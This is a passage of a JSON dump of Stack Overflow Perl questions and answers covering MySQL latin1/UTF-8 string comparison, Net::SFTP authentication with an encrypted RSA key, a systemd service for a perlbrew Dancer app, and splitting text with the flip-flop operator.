looks strange - but works!\n    if (is_utf8($val)) {\n        $val = encode('utf8', $val);\n    } else {\n        $val = encode('latin1', $val);\n    }\n    return $val;\n}\n\nsub new_value_will_change_database {\n    my ($current_value, $new_value) = @_;\n    my $mysql_new_value = mysql_value_latin1($new_value);\n    return $current_value ne $mysql_new_value;\n}\n\nmy @tests = (\n    [ 'str', $str ],\n    [ 'latin', $latin1 ],\n    [ 'utf8upgraded', $utf8upgraded ],\n    map { [ 'char ' . $_ , 'char' . chr($_) ] } ( 0x00 .. 0xFF ),\n);\n\nforeach (@tests) {\n    my ($disp, $val) = @$_;\n    my $mysql_roundtrip = mysql_roundtrip($val),\n    my $mysql_value_latin1 = mysql_value_latin1($val);\n    $mysql_value_latin1 eq $mysql_roundtrip\n        or die \"mysql_value_latin1 ne mysql_roundtrip\";\n}\nprint \"All test are fine\\n\";\n</code></pre>\n"}], "owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 498, "favorite_count": 2, "accepted_answer_id": 42025155, "answer_count": 4, "score": 3, "last_activity_date": 1486127518, "creation_date": 1485893113, "last_edit_date": 1486061531, "question_id": 41966534, "link": "https://stackoverflow.com/questions/41966534/perl-utf-8-encoding-how-to-detect-str1-eq-str2-to-avoid-mysql-round-trip", "title": "Perl UTF-8/encoding: How to detect $str1 eq $str2 to avoid MySQL round-trip?", "body": "<p>A caller to a sub has given me a value <code>$new_value</code>. I have selected a value from a MySQL database into scalar <code>$current_value</code>. I cannot figure out how to reliably detect whether they're \"identical\". By identical I mean: If I update a database record with <code>$new_value</code> will that change the database state?</p>\n\n<p>Boiling this down to its essence:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse utf8;\nuse strict;\nuse Encode qw(encode);\nmy $str = '\u00e6\u00f8\u00e5';\nmy $latin1 = encode('latin1', $str);\n\n# This in fact doesn't die. They're eq\n$str eq $latin1\n    or die;\n</code></pre>\n\n<p>If I update a field in a MySQL database with <code>$str</code>, I get one value back if I re-select it - a UTF-8 encoded value. Using <code>$latin1</code>, the database field ends up with another value - a latin1/ISO-8859-1 encoded value.</p>\n\n<p>The original problem I'm debugging updates a field with <code>CHARSET=latin1</code> but the symptoms show up equally well with a simple:</p>\n\n<pre><code>my $dbh = DBI-&gt;connect(\n    \"DBI:mysql:mysql\",\n    'user',\n    'pass',\n    # No, we don't have these options on our DB handles\n    # Introducing them now would causes (too) many regression issues\n    # for us, as in other places also, values are latin1 encoded,\n    # not UTF-8 encoded.\n    # mysql_enable_utf8 =&gt; 1,\n    # mysql_enable_utf8mb4 =&gt; 1`\n);\nmy $sth = $dbh-&gt;prepare('SELECT CONCAT(?)')\n    or die;\n$sth-&gt;execute($val);\nmy ($return_val) = $sth-&gt;fetchrow_array();\n</code></pre>\n\n<p>Since <code>$str</code> and <code>$latin1</code> result in different values after a MySQL round-trip, I'd like to detect that they are, in fact, not equal. So assuming the current value in the database is a correctly encoded latin1 <code>\u00e6\u00f8\u00e5</code> that I've already <code>SELECT</code>-ed that into a <code>$current_value</code> scalar then my question boils down to coding:</p>\n\n<pre><code>sub new_value_will_change_database {\n    my ($current_value, $new_value) = @_;\n    # How to write I write this sub, so it returns true for $str \n    # and false for $latin1 from above?\n    ...\n}\n</code></pre>\n\n<p>How do I accomplish that? The only difference I've been able to detect, is that the UTF8-flag is enabled on <code>$str</code>, but not on <code>$latin1</code>. However, I also seem to remember that if I'm checking the UTF-8 flag, my code is broken...</p>\n\n<h2>Fuller Debugging Script</h2>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse utf8;\nuse strict;\nuse feature qw(:5.10);\n\nuse Encode qw(encode is_utf8);\nuse DBI;\nuse Data::Dumper;\n\nmy $str = '\u00e6\u00f8\u00e5';\n\nmy $latin1 = encode('latin1', $str);\n\nmy $utf8upgraded = $latin1;\nutf8::upgrade($utf8upgraded);\n\n# $str, $latin1 and $utf8upgraded are all eq each other:\n$str eq $latin1\n    or die;\n$str eq $utf8upgraded\n    or die;\n$latin1 eq $utf8upgraded\n    or die;\n\nmy $dbh = DBI-&gt;connect(\n    \"DBI:mysql:mysql\",\n    'user',\n    'pass',\n);\n\nmy $sth = $dbh-&gt;prepare('SELECT CONCAT(?)')\n    or die;\n\nsub mysql_roundtrip {\n    my ($val) = @_;\n    $sth-&gt;execute($val);\n    my ($concat) = $sth-&gt;fetchrow_array();\n    return $concat;\n};\n\nforeach my $set (\n    [ 'str', $str ],\n    [ 'latin', $latin1 ],\n    [ 'utf8upgraded', $utf8upgraded ],\n) {\n    my ($disp, $val) = @$set;\n\n    my $hex = $val;\n    $hex =~ s/(.)/sprintf \"%X\", ord($1)/ge;\n\n    my $dumper = Data::Dumper-&gt;new([substr $val, 0, 1])-&gt;Terse(1)-&gt;Dump;\n    chomp $dumper;\n    printf \"%-13s: val:%s mysql:%s is_utf8:%d hex:%s dumper0:%s\\n\",\n        $disp,\n        $val,\n        mysql_roundtrip($val),\n        is_utf8($val),\n        $hex,\n        $dumper;\n}\n</code></pre>\n\n<p>produces this output:</p>\n\n<pre><code>str          : val:\ufffd\ufffd\ufffd mysql:\u00e6\u00f8\u00e5 is_utf8:1 hex:E6F8E5 dumper0:\"\\x{e6}\"\nlatin        : val:\ufffd\ufffd\ufffd mysql:\ufffd\ufffd\ufffd is_utf8:0 hex:E6F8E5 dumper0:'\ufffd'\nutf8upgraded : val:\ufffd\ufffd\ufffd mysql:\u00e6\u00f8\u00e5 is_utf8:1 hex:E6F8E5 dumper0:\"\\x{e6}\"\n</code></pre>\n"}, {"tags": ["perl", "rsa", "sftp", "net-sftp"], "comments": [{"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1485887868, "post_id": 41964908, "comment_id": 71108992, "body": "How sure are you that that key is valid and in a supported format?"}, {"owner": {"reputation": 33, "user_id": 7496665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ffd3517bb61f22610c0621cd36cd4b1?s=128&d=identicon&r=PG&f=1", "display_name": "martinjack", "link": "https://stackoverflow.com/users/7496665/martinjack"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1485887952, "post_id": 41964908, "comment_id": 71109042, "body": "I generated the key using ssh-keygen and could connect manually passwordless with: sftp user@server"}, {"owner": {"reputation": 2348, "user_id": 5179465, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d11933d9ee569ac40d0111430579f556?s=128&d=identicon&r=PG&f=1", "display_name": "ilke444", "link": "https://stackoverflow.com/users/5179465/ilke444"}, "edited": false, "score": 0, "creation_date": 1485890071, "post_id": 41964908, "comment_id": 71110158, "body": "Are you sure that the contents of <code>$HOST</code> and <code>$USER</code> are the same with your manual connection, which also matches the ones in id_rsa?"}, {"owner": {"reputation": 33, "user_id": 7496665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ffd3517bb61f22610c0621cd36cd4b1?s=128&d=identicon&r=PG&f=1", "display_name": "martinjack", "link": "https://stackoverflow.com/users/7496665/martinjack"}, "edited": false, "score": 0, "creation_date": 1485891240, "post_id": 41964908, "comment_id": 71110733, "body": "Yep, I just double checked again for the HOST and USER. What do you mean if matches the ones in id_rsa? id_rsa contains just the RSA PRIVATE KEY:  -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-............."}, {"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1485936175, "post_id": 41964908, "comment_id": 71127151, "body": "try using <a href=\"https://metacpan.org/pod/Net::SFTP::Foreign\" rel=\"nofollow noreferrer\">Net::SFTP::Foreign</a> instead."}], "answers": [{"tags": [], "owner": {"reputation": 131, "user_id": 4569694, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-n-pcBs_Pl3M/AAAAAAAAAAI/AAAAAAAAAE0/LP134Jfywxo/photo.jpg?sz=128", "display_name": "M Conrad", "link": "https://stackoverflow.com/users/4569694/m-conrad"}, "is_accepted": false, "score": 2, "last_activity_date": 1534353420, "last_edit_date": 1534353420, "creation_date": 1534353114, "answer_id": 51863332, "question_id": 41964908, "link": "https://stackoverflow.com/questions/41964908/netsftp-perl-rsa-authentification/51863332#51863332", "title": "Net::SFTP perl rsa authentification", "body": "<p>I just ran into this myself.</p>\n\n<p>The problem is that my (and your) private keys are encrypted, as you noted in your comment.  An encrypted private key requires you to enter the password before it can be used, and it seems the perl module doesn't support this.</p>\n\n<p>You claimed that you didn't need a password when using this key, but perhaps that was because sftp was using your ssh agent?  i.e. where you enter the password once and then the key remains in memory for use by all ssh-family of tools?  It would appear that the perl module doesn't support the agent, either, but @salva's suggestion to use <a href=\"https://metacpan.org/pod/Net::SFTP::Foreign\" rel=\"nofollow noreferrer\">Net::SFTP::Foreign</a> should solve that.</p>\n\n<p>It's worth noting that I got this exception while running code that used to work just fine on my workstation, but on a new install of perl.  I think what happened is that the Net::SSH::Perl module added support for reading private keys or changed the failure to read a private key into a fatal error rather than just ignoring the key.  My code wasn't using a key anyway, but now won't work with that encrypted key around.  This is fixed with:</p>\n\n<pre><code>my $sftp= Net::SFTP-&gt;new(\n   ...\n   ssh_args =&gt; [ identity_files =&gt; [] ]\n);\n</code></pre>\n\n<p>and of course you could add a list of specific (unencrypted) identity files that you want it to use rather than the default user's RSA id.</p>\n\n<p>If the code isn't easily edited, you could also avoid the problem by setting the environment variable <code>$HOME</code> to something that doesn't have a key in it.</p>\n"}], "owner": {"reputation": 33, "user_id": 7496665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ffd3517bb61f22610c0621cd36cd4b1?s=128&d=identicon&r=PG&f=1", "display_name": "martinjack", "link": "https://stackoverflow.com/users/7496665/martinjack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1016, "favorite_count": 1, "answer_count": 1, "score": 3, "last_activity_date": 1534353420, "creation_date": 1485887355, "last_edit_date": 1485887421, "question_id": 41964908, "link": "https://stackoverflow.com/questions/41964908/netsftp-perl-rsa-authentification", "title": "Net::SFTP perl rsa authentification", "body": "<p>I've been trying to sftp with the package Net::SFTP and an RSA key. I can manually sftp without password to my sftp server but when using the package it doesn't work. I'm running out of idea.</p>\n\n<pre><code>my $ftp = Net::SFTP-&gt;new($HOST, user =&gt; $USER, ssh_args =&gt; { identity_files =&gt; [ \"/Users/user/.ssh/id_rsa\" ] }, debug =&gt; 3 );\n</code></pre>\n\n<p>It gives me the following error:</p>\n\n<blockquote>\n  <p>Trying pubkey authentication with key file '/Users/tom/.ssh/id_rsa'</p>\n  \n  <p>FATAL: rsa import failed: Invalid input packet. at\n  /Library/Perl/5.18//Crypt/PK/RSA.pm line 123.</p>\n</blockquote>\n\n<p>Any help would be much appreciated,\nThanks!</p>\n"}, {"tags": ["perl", "systemd", "dancer", "perlbrew"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485885122, "post_id": 41963995, "comment_id": 71107412, "body": "Re &quot;<i>none of the perlbrew-related environment variables are getting set properly</i>&quot;, <code>perlbrew</code> servers two purposes, 1) a wrapper for a <code>perl</code> installer, and 2) a PATH manipulation tool. Neither of these should be relevant here."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485885172, "post_id": 41963995, "comment_id": 71107442, "body": "Re &quot;<i>So I end up with errors indicating missing libraries not found in @INC, when @INC doesn&#39;t contain anything at <code>&#47;home&#47;newlands&#47;.perlbrew&#47;libs&#47;perl-5.20.1@newlands</code> where the libraries actually are.</i>&quot;, uh, that&#39;s not where <code>perlbrew</code>-installed <code>perl</code> builds install libs. You seem to have overridden the install location? If so, you&#39;ll use <code>use lib ...</code> inside of your script, or set the <code>PERL5LIB</code> env var. (Neither of those things have anything to do with <code>perlbrew</code>. In fact, <code>perlbrew</code> is usually used to <i>avoid</i> doing these things!)"}, {"owner": {"reputation": 437, "user_id": 132317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01c7a557c46eba6e2748f26658d4380a?s=128&d=identicon&r=PG", "display_name": "Robin Smidsr&#248;d", "link": "https://stackoverflow.com/users/132317/robin-smidsr%c3%b8d"}, "edited": false, "score": 0, "creation_date": 1550416539, "post_id": 41963995, "comment_id": 96251484, "body": "Actually, what you&#39;re trying to do works, but only if you split it into two services. The reason for this is that <code>EnvironmentFile</code> seems to be read <i>before</i> <code>ExecStartPre</code> commands are executed. So if you create another <code>Type=oneshot</code> service called <code>myapp_env.service</code> that generates your environment file and in your <code>myapp.service</code> add <code>Requires=app_env.service</code> and <code>After=app_env.service</code> in the <code>Unit</code> section you should be good to go. In case of a perlbrew application that would be to <code>source $PERLBREW_ROOT&#47;etc&#47;bashrc</code> and then pipe the output of <code>printenv</code> to generate your file."}], "answers": [{"tags": [], "owner": {"reputation": 11251, "user_id": 254318, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fqtBB.jpg?s=128&g=1", "display_name": "Mark Stosberg", "link": "https://stackoverflow.com/users/254318/mark-stosberg"}, "is_accepted": true, "score": 2, "last_activity_date": 1485894945, "creation_date": 1485894945, "answer_id": 41967023, "question_id": 41963995, "link": "https://stackoverflow.com/questions/41963995/systemd-service-for-a-perlbrew-application/41967023#41967023", "title": "systemd service for a perlbrew application?", "body": "<p>The solution is not to blindly dump your Bash CLI environment into your systemd environment, the solution is to understand what environment variables you need and set those.</p>\n\n<p>As @ikegami points out, your problem is likely related to the <code>PERL5LIB</code> environment variable. So run your app from the CLI from and dump out the value of <code>$ENV{PERL5LIB}</code> to see what value the app expects, then set that in <code>systemd</code>. You may need to repeat the process with other variables. </p>\n\n<p>The result will be a clearly and precisely defined <code>systemd</code> environment that will run your app in a stable and consistent manner, regardless of how your <code>.bashrc</code> gets modified.</p>\n"}], "owner": {"reputation": 43, "user_id": 5503100, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/640abfe39316492596bcbbca9178df93?s=128&d=identicon&r=PG&f=1", "display_name": "Josh Rosenberg", "link": "https://stackoverflow.com/users/5503100/josh-rosenberg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 636, "favorite_count": 1, "accepted_answer_id": 41967023, "answer_count": 1, "score": 4, "last_activity_date": 1485894945, "creation_date": 1485884234, "question_id": 41963995, "link": "https://stackoverflow.com/questions/41963995/systemd-service-for-a-perlbrew-application", "title": "systemd service for a perlbrew application?", "body": "<p>My coworker wrote a Dancer psgi application called \"Newlands\" that makes use of perlbrew. I am trying to get the application to start up on system start using systemd. I have this service file:</p>\n\n<pre><code>[Unit]\nDescription=Newlands\nAfter=network-online.target\n\n[Service]\nType=forking\nUser=newlands\nWorkingDirectory=/home/newlands/working/newlands\nPIDFile=/home/newlands/newlands.pid\nExecStartPre=/bin/bash -c 'env &gt; /tmp/newlands.environment'\nExecStartPre=/bin/mkdir -p /tmp/newlands/newlands/session/\nExecStart=/usr/local/bin/starman --host 127.0.0.1 --listen :5000 --env production --preload-app --workers 12 --daemonize --error-log /var/log/newlands/newlands.error.log --pid /home/newlands/newlands.pid bin/newlandia.psgi\nEnvironmentFile=-/tmp/newlands.environment\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>\n\n<p>However, even with the ExecStartPre trick (which I got from <a href=\"http://tech.akom.net/archives/93-Getting-a-systemd-unit-to-read-your-.bashrc-file-for-its-environment.html\" rel=\"nofollow noreferrer\">http://tech.akom.net/archives/93-Getting-a-systemd-unit-to-read-your-.bashrc-file-for-its-environment.html</a>, modified not use the --login option), none of the perlbrew-related environment variables are getting set properly. So I end up with errors indicating missing libraries not found in @INC, when @INC doesn't contain anything at /home/newlands/.perlbrew/libs/perl-5.20.1@newlands where the libraries actually are.</p>\n\n<p>It seems that the outputted file at /tmp/newlands.environment still differs significantly from the output of \"env\" when actually logged in as the newlands user. I would like to source /opt/perlbrew/etc/bashrc or something like that, but I understand that's not possible.</p>\n\n<p>Any tips? Thanks!</p>\n"}, {"tags": ["perl", "delimiter", "flip-flop"], "comments": [{"owner": {"reputation": 12427, "user_id": 498634, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/580e34a7c6e156d847e8ee768388daa4?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel B&#246;hmer", "link": "https://stackoverflow.com/users/498634/daniel-b%c3%b6hmer"}, "edited": false, "score": 0, "creation_date": 1548067672, "post_id": 41959737, "comment_id": 95397322, "body": "I had a similar issues with an SQL file full of blocks delimited by the same SQL comment. When I failed to use the flip-flop operator, I eventually read the whole file into a variable with <code>perl -ne &quot;BEGIN { $&#47; = undef } ...&quot;</code> and used multiline-regexes to match the desired blocks."}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485873017, "post_id": 41959936, "comment_id": 71098890, "body": "One more thing... it works, but you&#39;re never resetting <code>$f</code>. Why not? You could put the reset and a <code>redo</code> into the second <code>if</code> block to make each pair actually be a pair, but I don&#39;t see a benefit in doing it."}], "tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": false, "score": 1, "last_activity_date": 1485879752, "last_edit_date": 1485879752, "creation_date": 1485872530, "answer_id": 41959936, "question_id": 41959737, "link": "https://stackoverflow.com/questions/41959737/perl-extract-text-between-same-delimiter-using-flip-flop/41959936#41959936", "title": "perl extract text between SAME delimiter using flip-flop", "body": "<p>I don't know how to do it with flipflop. I tried it before a year. But the same thing i did with some logic.</p>\n\n<pre><code>my $line_concat;\nmy $f = 0;\nwhile (&lt;DATA&gt;) {\n    if(/^2017/ &amp;&amp; !$f) {\n        $f = 1;\n    }\n\n    if (/^2017/) {\n        print \"$line_concat\\n\" if $line_concat ne \"\";\n        $line_concat = \"\";\n    }\n\n    $line_concat .= $_ if $f;\n}\n\nprint $line_concat if $line_concat ne \"\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485876989, "post_id": 41960187, "comment_id": 71101708, "body": "Hmm, well spotted. That <code>if</code> line is actually redundant isn&#39;t it?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485877438, "post_id": 41960187, "comment_id": 71102044, "body": "@Sobrique, It&#39;s used to skip the lines before the first one matching <code>&#47;^2017&#47;</code>."}], "tags": [], "owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "is_accepted": false, "score": 2, "last_activity_date": 1485879962, "last_edit_date": 1485879962, "creation_date": 1485873322, "answer_id": 41960187, "question_id": 41959737, "link": "https://stackoverflow.com/questions/41959737/perl-extract-text-between-same-delimiter-using-flip-flop/41960187#41960187", "title": "perl extract text between SAME delimiter using flip-flop", "body": "<p>Here is a way to go:</p>\n\n<pre><code>use Modern::Perl;\nuse Data::Dumper;\nmy $part = -1;\nmy $parts;\nwhile(&lt;DATA&gt;) {\n    chomp;\n    if (/^2017/ .. 1==0) {\n        $part++ if /^2017/;\n        push @{$parts-&gt;[$part]}, $_;\n    }\n}\nsay Dumper$parts;\n\n__DATA__\n2017 message 1\nText\nText\n\nText\n\n2017 message 2\nmore text\nmore text\n\nmore text\n\n2017 message 3\nyet more text\nyet more text\n\nyet more text\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>$VAR1 = [\n          [\n            '2017 message 1',\n            'Text',\n            'Text',\n            '',\n            'Text',\n            ''\n          ],\n          [\n            '2017 message 2',\n            'more text',\n            'more text',\n            '',\n            'more text',\n            ''\n          ],\n          [\n            '2017 message 3',\n            'yet more text',\n            'yet more text',\n            '',\n            'yet more text'\n          ]\n        ];\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1485875758, "last_edit_date": 1485875758, "creation_date": 1485873511, "answer_id": 41960253, "question_id": 41959737, "link": "https://stackoverflow.com/questions/41959737/perl-extract-text-between-same-delimiter-using-flip-flop/41960253#41960253", "title": "perl extract text between SAME delimiter using flip-flop", "body": "<p>Flip flop with a matched delimiter doesn't work too well, as you've found.</p>\n\n<p>Have you considered setting <code>$/</code> instead? </p>\n\n<p>E.g.:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings; \n\nlocal $/ = \"2017 message\";\nmy $count;\n\nwhile ( &lt;DATA&gt; ) {\n\n    print \"\\nStart of block:\", ++$count, \"\\n\";\n\n    print;\n\n    print \"\\nEnd of block:\", $count, \"\\n\";\n}\n\n__DATA__\n2017 message 1\nText\nText\n\nText\n\n2017 message 2\nmore text\nmore text\n\nmore text\n\n2017 message 3\nyet more text\nyet more text\n\nyet more text\n</code></pre>\n\n<p>Although it's not perfect, because it splits the file on the delimiter - meaning there's a 'bit' before the first one (so you get 4 chunks). You can resplice it with judicious use of 'chomp', which removes <code>$/</code> from the current chunk:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings; \n\nlocal $/ = \"2017 message\";\nmy $count;\n\nwhile ( &lt;DATA&gt; ) {\n    #remove '2017 message'\n    chomp;\n    #check for empty (first) block\n    next unless /\\S/;\n    print \"\\nStart of block:\", ++$count, \"\\n\";\n    #re add '2017 message'\n    print $/;\n    print;\n\n    print \"\\nEnd of block:\", $count, \"\\n\";\n}\n</code></pre>\n\n<p>Alternatively, how about an array of arrays, that you update the 'target key' each time you hit a message? </p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings; \n\nuse Data::Dumper;\n\nmy %messages; \nmy $message_id;\nwhile ( &lt;DATA&gt; ) {\n   chomp;\n   if ( m/2017 message (\\d+)/ ) { $message_id = $1 }; \n   push @{ $messages{$message_id} }, $_; \n}\n\nprint Dumper \\%messages;\n</code></pre>\n\n<p>Note - I'm using a hash, not an array, because that's a bit more robust for messages sequencing that doesn't start consecutively from zero. (And array using this approach would have an empty 'zeroth' element). </p>\n\n<p>Note - it also will have 'empty' <code>''</code> elements for you blank lines. You can filter these if you wish though. </p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485882044, "post_id": 41961478, "comment_id": 71105468, "body": "The above comments were never correct, and have been rendered obsolete by changes to the answer."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1485881965, "last_edit_date": 1485881965, "creation_date": 1485877046, "answer_id": 41961478, "question_id": 41959737, "link": "https://stackoverflow.com/questions/41959737/perl-extract-text-between-same-delimiter-using-flip-flop/41961478#41961478", "title": "perl extract text between SAME delimiter using flip-flop", "body": "<p>You just need a buffer that accumulates the lines until you find one matching <code>/^20\\d\\d[ ]/</code> or end of file.</p>\n\n<pre><code>my $in = 0;\nmy @buf;\nwhile (&lt;&gt;) {\n   if ($in &amp;&amp; /^20\\d\\d[ ]/) {\n      process(@buf);\n      @buf = ();\n      $in = 0;\n   }\n\n   push @buf, $_ if $in ||= /^2017[ ]/;\n}\n\nprocess(@buf) if $in;\n</code></pre>\n\n<hr>\n\n<p>We can rearrange the code to make it so the records are only processed in one spot, allowing <code>process</code> to be inlined.</p>\n\n<pre><code>my $in = 0;\nmy @buf;\nwhile (1) {\n   $_ = &lt;&gt;;\n\n   if ($in &amp;&amp; (!defined($_) || /^20\\d\\d[ ]/)) {\n      process(@buf);\n      @buf = ();\n      $in = 0;\n   }\n\n   last if !defined($_);\n\n   push @buf, $_ if $in ||= /^2017[ ]/;\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7495217, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e2067df426e7805442f100b6e586be?s=128&d=identicon&r=PG&f=1", "display_name": "jd2000", "link": "https://stackoverflow.com/users/7495217/jd2000"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 190, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1485881965, "creation_date": 1485871948, "last_edit_date": 1485872819, "question_id": 41959737, "link": "https://stackoverflow.com/questions/41959737/perl-extract-text-between-same-delimiter-using-flip-flop", "title": "perl extract text between SAME delimiter using flip-flop", "body": "<p>I have been able to use flip-flop to extract text in past where I have different START &amp; END.\nThis time I've been having A LOT of trouble trying to extract text because I do not have different delimiters in my source file, because START &amp; END of flip flop are the same.  I want flip flop to start true when line beings with year yyyy &amp; continue to push <code>$_</code> to an array until another line begins yyyy.\nThe problem with flip-flop is that it will then be false on my next START.</p>\n\n<pre><code>while (&lt;SOURCEFILE&gt;) {\n  print if (/^2017/ ... /^2017/) \n}\n</code></pre>\n\n<p>Using the above for the given source data will miss the 2nd multi-line part of the file I also need to match.  Maybe flip-flop which I thought was the best way to parse a multi line file will not work in this case?  What I want to do is start matching with the first line starting with date &amp; continue matching until the line before the next line beginning with a date.</p>\n\n<p>Sample Data is:</p>\n\n<pre><code>2017 message 1\nText\nText\n\nText\n\n2017 message 2\nmore text\nmore text\n\nmore text\n\n2017 message 3\nyet more text\nyet more text\n\nyet more text\n</code></pre>\n\n<p>But I am getting:</p>\n\n<pre><code>2017 message 1\nText\nText\n\nText\n\n2017 message 2\n2017 message 3\nyet more text\nyet more text\n\nyet more text\n</code></pre>\n\n<p>...missing message 2 contents..</p>\n\n<p>I cannot rely on space or a different END delimiter in my source data.\nWhat I wanted was for each message to be printed (actually <code>push @myarray, $_</code> &amp; then test for matches), but here I am missing lines below message 2 because flip flop is set to false.  Any way to handle this with flip-flop or I need to use something else?\nThanks in advance for anyone that can help/advise.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50800, "user_id": 1765658, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2dcfe3194de7a9e1a1cdaa81933b307?s=128&d=identicon&r=PG", "display_name": "F. Hauri", "link": "https://stackoverflow.com/users/1765658/f-hauri"}, "edited": false, "score": 0, "creation_date": 1485870382, "post_id": 41959111, "comment_id": 71097042, "body": "It&#39;s maybe because <code>&#47;tmp&#47;test-*.xml</code> is not an existant file! Did you try this with <code>&#47;tmp&#47;test-1.xml</code> ?"}], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 